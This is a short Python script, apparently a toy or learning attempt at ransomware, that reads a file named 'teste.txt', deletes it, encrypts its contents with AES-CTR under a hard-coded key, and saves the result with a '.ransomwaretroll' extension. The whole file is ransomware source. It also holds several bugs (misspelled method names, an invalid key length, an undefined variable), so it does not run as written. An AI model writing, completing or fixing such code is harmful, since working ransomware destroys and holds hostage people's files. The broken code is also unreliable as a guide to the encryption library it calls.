import os
import pyaes

file_name = "teste.txt"
file = open(file_name, "rb")
file_data = file.read()

os.remove(file_name)

key = b"maistestedioransom"
aes = pyaes.AESModeOfOperationsCTR(key)

crypto_data = aes.encript(file_data)

new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}','wb')
new_filme.write(crypto_data)
new_file.close()
